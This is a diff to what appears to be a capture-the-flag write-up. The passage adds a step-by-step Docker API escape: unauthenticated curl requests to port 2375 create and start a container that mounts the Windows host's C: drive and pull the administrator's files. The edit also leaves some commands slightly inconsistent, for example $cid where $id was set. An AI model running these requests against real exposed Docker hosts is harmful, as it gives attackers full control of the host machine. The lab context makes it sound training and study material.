@@ -224,15 +224,21 @@ cat user.txt
 384d5ae97056bfd866a2409c647c9657
 ```
 
-Now to the Docker CVE. 
+Now to the Docker CVE. Basically this CVE allows the attacker to call the Docker API endpoint to create a container that mounts the host's drive into the container, which then we can access via that newly created container. Steps to reproduce:
+
+- Connect to http://192.168.65.7:2375/ without authentication
+- Create and start a privileged container
+- Mount the host `C:` drive into that container (`/run/desktop/mnt/host/c/`)
+- Gain full access on the Windows host via Docker API
 
 ```sh
-www-data@821fbd6a43fa:~/html/cacti$ curl -s -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine", "Tty": true, "Cmd":["sh", "-c", "cat /mnt/users/administrator/desktop/root.txt"], "HostConfig":{"Binds": ["/run/desktop/mnt/host/c/:/mnt"]}}' | tee c.json
-{"Id":"8ec3ff30688153f0a6f30b140e75af52e839e12a20ff02abc268121a06b3f81f","Warnings":[]}
+www-data@821fbd6a43fa:~/html/cacti$ curl -s -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine", "HostConfig":{"Binds": ["/run/desktop/mnt/host/c/:/mnt"]}}' > c.json
 www-data@821fbd6a43fa:~/html/cacti$ id=$(cut -d'"' -f4 c.json)
 www-data@821fbd6a43fa:~/html/cacti$ echo $id
 8ec3ff30688153f0a6f30b140e75af52e839e12a20ff02abc268121a06b3f81f
 www-data@821fbd6a43fa:~/html/cacti$ curl -s -X POST http://192.168.65.7:2375/containers/$id/start
-www-data@821fbd6a43fa:~/html/cacti$ curl -s "http://192.168.65.7:2375/containers/$id/logs?stdout=1&stderr=1"
+www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/containers/$cid/archive?path=/mnt/users/administrator/desktop/ -O desktop.tar
+www-data@821fbd6a43fa:~/html/cacti$ tar -xvf desktop.tar
+www-data@821fbd6a43fa:~/html/cacti$ cat desktop/root.txt
 e93cddf22bab571aa7e83ab7c8cb271c
 ```
